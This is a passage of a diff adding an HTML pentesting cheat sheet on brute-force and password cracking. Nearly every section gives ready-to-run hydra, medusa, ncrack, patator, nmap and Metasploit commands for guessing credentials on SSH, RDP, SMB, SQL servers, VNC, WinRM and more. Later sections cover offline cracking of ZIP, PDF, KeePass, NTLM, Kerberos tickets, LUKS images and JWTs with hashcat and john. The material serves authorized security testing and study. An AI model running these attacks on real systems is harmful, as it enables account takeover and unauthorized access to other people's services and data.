+python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
+
+#https://github.com/lmammino/jwt-cracker
+jwt-cracker &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ&#34; &#34;abcdefghijklmnopqrstuwxyz&#34; 6
+</code></pre><h3 id="ldap">
+  LDAP
+  <a class="anchor" href="#ldap">#</a>
+</h3>
+<pre tabindex="0"><code>nmap --script ldap-brute -p 389 &lt;IP&gt;
+</code></pre><h3 id="mqtt">
+  MQTT
+  <a class="anchor" href="#mqtt">#</a>
+</h3>
+<pre tabindex="0"><code>ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
+</code></pre><h3 id="mongo">
+  Mongo
+  <a class="anchor" href="#mongo">#</a>
+</h3>
+<pre tabindex="0"><code>nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;
+use auxiliary/scanner/mongodb/mongodb_login
+</code></pre><h3 id="mysql">
+  MySQL
+  <a class="anchor" href="#mysql">#</a>
+</h3>
+<pre tabindex="0"><code># hydra
+hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql
+
+# msfconsole
+msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
+
+# medusa
+medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql
+</code></pre><h3 id="oraclesql">
+  OracleSQL
+  <a class="anchor" href="#oraclesql">#</a>
+</h3>
+<pre tabindex="0"><code>patator oracle_login sid=&lt;SID&gt; host=&lt;IP&gt; user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
+
+./odat.py passwordguesser -s $SERVER -d $SID
+./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt
+
+#msf1
+msf&gt; use admin/oracle/oracle_login
+msf&gt; set RHOSTS &lt;IP&gt;
+msf&gt; set RPORT 1521
+msf&gt; set SID &lt;SID&gt;
+
+#msf2, this option uses nmap and it fails sometimes for some reason
+msf&gt; use scanner/oracle/oracle_login
+msf&gt; set RHOSTS &lt;IP&gt;
+msf&gt; set RPORTS 1521
+msf&gt; set SID &lt;SID&gt;
+
+#for some reason nmap fails sometimes when executing this script
+nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=&lt;SID&gt; &lt;IP&gt;
+In order to use oracle_login with patator you need to install:
+pip3 install cx_Oracle --upgrade
+Offline OracleSQL hash bruteforce (versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3):
+ nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
+</code></pre><h3 id="pop">
+  POP
+  <a class="anchor" href="#pop">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; pop3 -V
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f &lt;IP&gt; pop3 -V
+</code></pre><h3 id="postgresql">
+  PostgreSQL
+  <a class="anchor" href="#postgresql">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres
+medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
+ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432
+patator pgsql_login host=&lt;IP&gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
+use auxiliary/scanner/postgres/postgres_login
+nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;
+</code></pre><h3 id="pptp">
+  PPTP
+  <a class="anchor" href="#pptp">#</a>
+</h3>
+<pre tabindex="0"><code>You can download the .deb package to install from https://http.kali.org/pool/main/t/thc-pptp-bruter/
+sudo dpkg -i thc-pptp-bruter*.deb #Install the package
+cat rockyou.txt | thc-pptp-bruter –u &lt;Username&gt; &lt;IP&gt;
+</code></pre><h3 id="rdp">
+  RDP
+  <a class="anchor" href="#rdp">#</a>
+</h3>
+<pre tabindex="0"><code>ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;
+hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;
+</code></pre><h3 id="redis">
+  Redis
+  <a class="anchor" href="#redis">#</a>
+</h3>
+<pre tabindex="0"><code>msf&gt; use auxiliary/scanner/redis/redis_login
+nmap --script redis-brute -p 6379 &lt;IP&gt;
+hydra –P /path/pass.txt redis://&lt;IP&gt;:&lt;PORT&gt; # 6379 is the default
+</code></pre><h3 id="rexec">
+  Rexec
+  <a class="anchor" href="#rexec">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V
+</code></pre><h3 id="rlogin">
+  Rlogin
+  <a class="anchor" href="#rlogin">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V
+</code></pre><h3 id="rsh">
+  Rsh
+  <a class="anchor" href="#rsh">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V
+http://pentestmonkey.net/tools/misc/rsh-grind
+</code></pre><h3 id="rsync">
+  Rsync
+  <a class="anchor" href="#rsync">#</a>
+</h3>
+<pre tabindex="0"><code>nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 &lt;IP&gt;
+</code></pre><h3 id="rtsp">
+  RTSP
+  <a class="anchor" href="#rtsp">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l root -P passwords.txt &lt;IP&gt; rtsp
+</code></pre><h3 id="snmp">
+  SNMP
+  <a class="anchor" href="#snmp">#</a>
+</h3>
+<pre tabindex="0"><code>msf&gt; use auxiliary/scanner/snmp/snmp_login
+nmap -sU --script snmp-brute &lt;target&gt; [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]
+onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt &lt;IP&gt;
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
+</code></pre><h3 id="smb">
+  SMB
+  <a class="anchor" href="#smb">#</a>
+</h3>
+<pre tabindex="0"><code>nmap --script smb-brute -p 445 &lt;IP&gt;
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+</code></pre><h3 id="smtp">
+  SMTP
+  <a class="anchor" href="#smtp">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l &lt;username&gt; -P /path/to/passwords.txt &lt;IP&gt; smtp -V
+hydra -l &lt;username&gt; -P /path/to/passwords.txt -s 587 &lt;IP&gt; -S -v -V #Port 587 for SMTP with SSL
+</code></pre><h3 id="socks">
+  SOCKS
+  <a class="anchor" href="#socks">#</a>
+</h3>
+<pre tabindex="0"><code>nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 &lt;IP&gt;
+</code></pre><h3 id="sql-server">
+  SQL Server
+  <a class="anchor" href="#sql-server">#</a>
+</h3>
+<pre tabindex="0"><code>#Use the NetBIOS name of the machine as domain
+crackmapexec mssql &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; mssql
+medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
+nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts &lt;host&gt; #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
+msf&gt; use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
+</code></pre><h3 id="ssh">
+  SSH
+  <a class="anchor" href="#ssh">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh
+ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh
+patator ssh_login host=&lt;ip&gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg=&#39;Authentication failed&#39;
+</code></pre><h3 id="telnet">
+  Telnet
+  <a class="anchor" href="#telnet">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet
+ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet
+</code></pre><h3 id="vnc">
+  VNC
+  <a class="anchor" href="#vnc">#</a>
+</h3>
+<pre tabindex="0"><code>hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
+medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc
+ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T
+patator vnc_login host=&lt;IP&gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!=&#39;Authentication failure&#39; --max-retries 0 –x quit:code=0
+use auxiliary/scanner/vnc/vnc_login
+nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;
+
+#Metasploit
+use auxiliary/scanner/vnc/vnc_login
+set RHOSTS &lt;ip&gt;
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
+</code></pre><h3 id="winrm">
+  Winrm
+  <a class="anchor" href="#winrm">#</a>
+</h3>
+<pre tabindex="0"><code>crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+</code></pre><h2 id="cracking-locally">
+  Cracking Locally
+  <a class="anchor" href="#cracking-locally">#</a>
+</h2>
+<h3 id="online-cracking-databases">
+  Online cracking databases
+  <a class="anchor" href="#online-cracking-databases">#</a>
+</h3>
+<p>(<a href="http://hashtoolkit.com/reverse-hash">http://hashtoolkit.com/reverse-hash</a>?) (MD5 &amp; SHA1)
+(<a href="https://www.onlinehashcrack.com/">https://www.onlinehashcrack.com/</a>) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF&hellip;)
+(<a href="https://crackstation.net/">https://crackstation.net/</a>) (Hashes)
+(<a href="https://md5decrypt.net/">https://md5decrypt.net/</a>) (MD5)
+(<a href="https://gpuhash.me/">https://gpuhash.me/</a>) (Hashes and file hashes)
+(<a href="https://hashes.org/search.php">https://hashes.org/search.php</a>) (Hashes)
+(<a href="https://www.cmd5.org/">https://www.cmd5.org/</a>) (Hashes)
+(<a href="https://hashkiller.co.uk/Cracker">https://hashkiller.co.uk/Cracker</a>) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
+(<a href="https://www.md5online.org/md5-decrypt.html">https://www.md5online.org/md5-decrypt.html</a>) (MD5)
+(<a href="http://reverse-hash-lookup.online-domain-tools.com/">http://reverse-hash-lookup.online-domain-tools.com/</a>)</p>
+<h3 id="zip">
+  ZIP
+  <a class="anchor" href="#zip">#</a>
+</h3>
+<pre tabindex="0"><code>#sudo apt-get install fcrackzip 
+fcrackzip -u -D -p &#39;/usr/share/wordlists/rockyou.txt&#39; chall.zip
+zip2john file.zip &gt; zip.john
+john zip.john
+#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
+hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
+.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
+
+Known plaintext zip attack
+You need to know the plaintext (or part of the plaintext) of a file contained inside the encrypted zip. You can check filenames and size of files contained inside an encrypted zip running: 7z l encrypted.zip
+Download bkcrack from the releases page.
+# You need to create a zip file containing only the file that is inside the encrypted zip
+zip plaintext.zip plaintext.file
+
+./bkcrack -C &lt;encrypted.zip&gt; -c &lt;plaintext.file&gt; -P &lt;plaintext.zip&gt; -p &lt;plaintext.file&gt;
+# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
+# With that key you can create a new zip file with the content of encrypted.zip
+# but with a different pass that you set (so you can decrypt it)
+./bkcrack -C &lt;encrypted.zip&gt; -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd 
+unzip unlocked.zip #User new_pwd as password
+</code></pre><h3 id="7z">
+  7z
+  <a class="anchor" href="#7z">#</a>
+</h3>
+<pre tabindex="0"><code>cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
+#Download and install requirements for 7z2john
+wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
+apt-get install libcompress-raw-lzma-perl
+./7z2john.pl file.7z &gt; 7zhash.john
+</code></pre><h3 id="pdf">
+  PDF
+  <a class="anchor" href="#pdf">#</a>
+</h3>
+<pre tabindex="0"><code>apt-get install pdfcrack
+pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
+#pdf2john didn&#39;t work well, john didn&#39;t know which hash type was
+# To permanently decrypt the pdf
+sudo apt-get install qpdf
+qpdf --password=&lt;PASSWORD&gt; --decrypt encrypted.pdf plaintext.pdf
+</code></pre><h3 id="pdf-owner-password">
+  PDF Owner Password
+  <a class="anchor" href="#pdf-owner-password">#</a>
+</h3>
+<p>To crack a PDF Owner password check this: <a href="https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/">https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/</a></p>
+<h3 id="jwt-1">
+  JWT
+  <a class="anchor" href="#jwt-1">#</a>
+</h3>
+<pre tabindex="0"><code>git clone https://github.com/Sjord/jwtcrack.git
+cd jwtcrack
+</code></pre><pre tabindex="0"><code>#Bruteforce using crackjwt.py
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+</code></pre><pre tabindex="0"><code>#Bruteforce using john
+python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc &gt; jwt.john
+john jwt.john #It does not work with Kali-John
+</code></pre><h3 id="ntlm-cracking">
+  NTLM cracking
+  <a class="anchor" href="#ntlm-cracking">#</a>
+</h3>
+<pre tabindex="0"><code>Format:USUARIO:ID:HASH_LM:HASH_NT:::
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
+hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
+</code></pre><h3 id="keepass">
+  Keepass
+  <a class="anchor" href="#keepass">#</a>
+</h3>
+<pre tabindex="0"><code>sudo apt-get install -y kpcli #Install keepass tools like keepass2john
+keepass2john file.kdbx &gt; hash #The keepass is only using password
+keepass2john -k &lt;file-password&gt; file.kdbx &gt; hash # The keepass is also using a file as a needed credential
+#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre><h3 id="keberoasting">
+  Keberoasting
+  <a class="anchor" href="#keberoasting">#</a>
+</h3>
+<pre tabindex="0"><code>john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+</code></pre><h3 id="lucks-image">
+  Lucks image
+  <a class="anchor" href="#lucks-image">#</a>
+</h3>
+<h4 id="method-1">
+  Method 1
+  <a class="anchor" href="#method-1">#</a>
+</h4>
+<pre tabindex="0"><code>Install: https://github.com/glv2/bruteforce-luks
+bruteforce-luks -f ./list.txt ./backup.img
+cryptsetup luksOpen backup.img mylucksopen
+ls /dev/mapper/ #You should find here the image mylucksopen
+mount /dev/mapper/mylucksopen /mnt
+</code></pre><h4 id="method-2">
+  Method 2
+  <a class="anchor" href="#method-2">#</a>
+</h4>
+<pre tabindex="0"><code>cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
+dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
+hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
+cryptsetup luksOpen backup.img mylucksopen
+ls /dev/mapper/ #You should find here the image mylucksopen
+mount /dev/mapper/mylucksopen /mnt
+Another Luks BF tutorial: http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1
+</code></pre><h3 id="mysql-1">
+  Mysql
+  <a class="anchor" href="#mysql-1">#</a>
+</h3>
+<pre tabindex="0"><code>#John hash format
+&lt;USERNAME&gt;:$mysqlna$&lt;CHALLENGE&gt;*&lt;RESPONSE&gt;
+dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
+PGP/GPG Private key
+gpg2john private_pgp.key #This will generate the hash and save it in a file
+john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
+</code></pre><h3 id="dpapi-master-key">
+  DPAPI Master Key
+  <a class="anchor" href="#dpapi-master-key">#</a>
+</h3>
+<p>Use <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py">https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py</a> and then john</p>
+<h3 id="open-office-pwd-protected-column">
+  Open Office Pwd Protected Column
+  <a class="anchor" href="#open-office-pwd-protected-column">#</a>
+</h3>
+<pre tabindex="0"><code>If you have an xlsx file with a column protected by a password you can unprotect it:
+Upload it to google drive and the password will be automatically removed
+To remove it manually:
+unzip file.xlsx
+grep -R &#34;sheetProtection&#34; ./*
+# Find something like: &lt;sheetProtection algorithmName=&#34;SHA-512&#34;
+hashValue=&#34;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg&#34; saltValue=&#34;U9oZfaVCkz5jWdhs9AA8nA&#34; spinCount=&#34;100000&#34; sheet=&#34;1&#34; objects=&#34;1&#34; scenarios=&#34;1&#34;/&gt;
+# Remove that line and rezip the file
+zip -r file.xls .
+</code></pre><h3 id="pfx-certificates">
+  PFX Certificates
+  <a class="anchor" href="#pfx-certificates">#</a>
+</h3>
+<pre tabindex="0"><code># From https://github.com/Ridter/p12tool
+./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
+# From https://github.com/crackpkcs12/crackpkcs12
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
+</code></pre><h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<p>Hash examples: <a href="https://openwall.info/wiki/john/sample-hashes">https://openwall.info/wiki/john/sample-hashes</a></p>
+<h3 id="hash-identifier">
+  Hash-identifier
+  <a class="anchor" href="#hash-identifier">#</a>
+</h3>
+<pre tabindex="0"><code> hash-identifie4
+ &gt; &lt;HASH&gt;
+</code></pre><h3 id="wordlists-1">
+  Wordlists
+  <a class="anchor" href="#wordlists-1">#</a>
+</h3>
+<pre tabindex="0"><code>Rockyou
+Probable-Wordlists
+Kaonashi
+Seclists - Passwords
+</code></pre><h3 id="wordlist-generation-tools">
+  Wordlist Generation Tools
+  <a class="anchor" href="#wordlist-generation-tools">#</a>
+</h3>
+<pre tabindex="0"><code>kwprocessor: Advanced keyboard-walk generator with configurable base chars, keymap and routes.
+kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
+</code></pre><h3 id="john-mutation">
+  John mutation
+  <a class="anchor" href="#john-mutation">#</a>
+</h3>
+<p>Read /etc/john/john.conf and configure it</p>
+<pre tabindex="0"><code>john --wordlist=words.txt --rules --stdout &gt; w_mutated.txt
+john --wordlist=words.txt --rules=all --stdout &gt; w_mutated.txt #Apply all rules
+</code></pre><h3 id="hashcat">
+  Hashcat
+  <a class="anchor" href="#hashcat">#</a>
+</h3>
+<h4 id="hashcat-attacks">
+  Hashcat attacks
+  <a class="anchor" href="#hashcat-attacks">#</a>
+</h4>
+<h4 id="wordlist-attack--a-0-with-rules">
+  Wordlist attack (-a 0) with rules
+  <a class="anchor" href="#wordlist-attack--a-0-with-rules">#</a>
+</h4>
+<p>Hashcat already comes with a folder containing rules but you can find other interesting rules here.</p>
+<pre tabindex="0"><code>hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
+</code></pre><h4 id="wordlist-combinator-attack">
+  Wordlist combinator attack
+  <a class="anchor" href="#wordlist-combinator-attack">#</a>
+</h4>
+<pre tabindex="0"><code>It&#39;s possible to combine 2 wordlists into 1 with hashcat.
+If list 1 contained the word &#34;hello&#34; and the second contained 2 lines with the words &#34;world&#34; and &#34;earth&#34;. The words helloworld and helloearth will be generated.
+# This will combine 2 wordlists
+hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
+
+# Same attack as before but adding chars in the newly generated words
+# In the previous example this will generate:
+## hello-world!
+## hello-earth!
+hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
+Mask attack (-a 3)
+# Mask attack with simple mask
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
+
+hashcat --help #will show the charsets and are as follows
+? | Charset
+===+=========
+l | abcdefghijklmnopqrstuvwxyz
+u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+d | 0123456789
+h | 0123456789abcdef
+H | 0123456789ABCDEF
+s | !&#34;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
+a | ?l?u?d?s
+b | 0x00 - 0xff
+
+# Mask attack declaring custom charset
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
+## -1 ?d?s defines a custom charset (digits and specials).
+## ?u?l?l?l?l?l?l?l?1 is the mask, where &#34;?1&#34; is the custom charset.
+
+# Mask attack with variable password length
+## Create a file called masks.hcmask with this content:
+?d?s,?u?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?l?1
+## Use it to crack the password
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
+Wordlist + Mask (-a 6) / Mask + Wordlist (-a 7) attack
+# Mask numbers will be appended to each word in the wordlist
+hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
+
+# Mask numbers will be prepended to each word in the wordlist
+hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
+Hashcat modes
+hashcat --example-hashes | grep -B1 -A2 &#34;NTLM&#34;
+Cracking Linux Hashes - /etc/shadow file
+ 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
+3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
+7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
+1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
+Cracking Windows Hashes
+3000 | LM                                               | Operating-Systems
+1000 | NTLM                                             | Operating-Systems
+Cracking Common Application Hashes
+  900 | MD4                                              | Raw Hash
+    0 | MD5                                              | Raw Hash
+ 5100 | Half MD5                                         | Raw Hash
+  100 | SHA1                                             | Raw Hash
+10800 | SHA-384                                          | Raw Hash
+ 1400 | SHA-256                                          | Raw Hash
+ 1700 | SHA-512                                          | Raw Hash
+</code></pre></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#brute-force-cracking">Brute Force Cracking</a>
+      <ul>
+        <li><a href="#making-wordslists">Making wordslists</a>
+          <ul>
+            <li><a href="#crunch">Crunch</a></li>
+            <li><a href="#cewl">Cewl</a></li>
+            <li><a href="#cupp">CUPP</a></li>
+            <li><a href="#pydictor">pydictor</a></li>
+            <li><a href="#wordlists">Wordlists</a></li>
+          </ul>
+        </li>
+        <li><a href="#default-credentials">Default Credentials</a></li>
+        <li><a href="#brute-force-cheatsheeet">Brute Force Cheatsheeet</a>
+          <ul>
+            <li><a href="#services">Services</a></li>
+            <li><a href="#afp">AFP</a></li>
+            <li><a href="#ajp">AJP</a></li>
+            <li><a href="#cassandra">Cassandra</a></li>
+            <li><a href="#couchdb">CouchDB</a></li>
+            <li><a href="#docker-registry">Docker Registry</a></li>
+            <li><a href="#elasticsearch">Elasticsearch</a></li>
+            <li><a href="#ftp">FTP</a></li>
+            <li><a href="#http-generic-brute">HTTP Generic Brute</a></li>
+            <li><a href="#http-basic-auth">HTTP Basic Auth</a></li>
+            <li><a href="#http---post-form">HTTP - Post Form</a></li>
+            <li><a href="#http---cms----wordpress-joomla-or-drupal-or-moodle">HTTP - CMS &ndash; (W)ordpress, (J)oomla or (D)rupal or (M)oodle</a></li>
+            <li><a href="#imap">IMAP</a></li>
+            <li><a href="#irc">IRC</a></li>
+            <li><a href="#iscsi">ISCSI</a></li>
+            <li><a href="#jwt">JWT</a></li>
+            <li><a href="#ldap">LDAP</a></li>
+            <li><a href="#mqtt">MQTT</a></li>
+            <li><a href="#mongo">Mongo</a></li>
+            <li><a href="#mysql">MySQL</a></li>
+            <li><a href="#oraclesql">OracleSQL</a></li>
+            <li><a href="#pop">POP</a></li>
+            <li><a href="#postgresql">PostgreSQL</a></li>
+            <li><a href="#pptp">PPTP</a></li>
+            <li><a href="#rdp">RDP</a></li>
+            <li><a href="#redis">Redis</a></li>
+            <li><a href="#rexec">Rexec</a></li>
+            <li><a href="#rlogin">Rlogin</a></li>
+            <li><a href="#rsh">Rsh</a></li>
+            <li><a href="#rsync">Rsync</a></li>
+            <li><a href="#rtsp">RTSP</a></li>
+            <li><a href="#snmp">SNMP</a></li>
+            <li><a href="#smb">SMB</a></li>
+            <li><a href="#smtp">SMTP</a></li>
+            <li><a href="#socks">SOCKS</a></li>
+            <li><a href="#sql-server">SQL Server</a></li>
+            <li><a href="#ssh">SSH</a></li>
+            <li><a href="#telnet">Telnet</a></li>
+            <li><a href="#vnc">VNC</a></li>
+            <li><a href="#winrm">Winrm</a></li>
+          </ul>
+        </li>
+        <li><a href="#cracking-locally">Cracking Locally</a>
+          <ul>
+            <li><a href="#online-cracking-databases">Online cracking databases</a></li>
+            <li><a href="#zip">ZIP</a></li>
+            <li><a href="#7z">7z</a></li>
+            <li><a href="#pdf">PDF</a></li>
+            <li><a href="#pdf-owner-password">PDF Owner Password</a></li>
+            <li><a href="#jwt-1">JWT</a></li>
+            <li><a href="#ntlm-cracking">NTLM cracking</a></li>
+            <li><a href="#keepass">Keepass</a></li>
+            <li><a href="#keberoasting">Keberoasting</a></li>
+            <li><a href="#lucks-image">Lucks image</a></li>
+            <li><a href="#mysql-1">Mysql</a></li>
+            <li><a href="#dpapi-master-key">DPAPI Master Key</a></li>
+            <li><a href="#open-office-pwd-protected-column">Open Office Pwd Protected Column</a></li>
+            <li><a href="#pfx-certificates">PFX Certificates</a></li>
+          </ul>
+        </li>
+        <li><a href="#tools">Tools</a>
+          <ul>
+            <li><a href="#hash-identifier">Hash-identifier</a></li>
+            <li><a href="#wordlists-1">Wordlists</a></li>
+            <li><a href="#wordlist-generation-tools">Wordlist Generation Tools</a></li>
+            <li><a href="#john-mutation">John mutation</a></li>
+            <li><a href="#hashcat">Hashcat</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
